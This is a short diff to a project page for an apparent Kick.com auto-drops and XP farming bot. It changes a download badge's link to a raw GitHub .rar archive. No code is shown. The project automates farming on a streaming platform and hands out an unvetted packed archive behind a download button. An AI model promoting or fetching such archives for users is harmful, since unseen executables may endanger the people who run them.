@@ -14,7 +14,7 @@
 <br>
 
 <!-- İNDİRME BUTONU / DOWNLOAD BUTTON -->
-<a href="[https://github.com/3Q1NOX/Kick.com-Auto-Drops-XP-Bot-KickDropsLevel/raw/refs/heads/main/dropslevel.rar](https://github.com/3Q1NOX/Kick.com-Auto-Drops-XP-Bot-KickDropsLevel/raw/refs/heads/main/K%C4%B0CK%20LEVEL%20XP%20DROP.rar)">
+<a href="https://raw.githubusercontent.com/3Q1NOX/Kick.com-Auto-Drops-XP-Bot-KickDropsLevel/refs/heads/main/K%C4%B0CK%20LEVEL%20XP%20DROP.rar">
   <img src="https://img.shields.io/badge/⚡_DOWNLOAD-KICK_DROPS_%26_LEVEL_v1.0.37-53FC18?style=for-the-badge&logo=kick&logoColor=black&labelColor=000000" alt="Download Extension">
 </a>
 
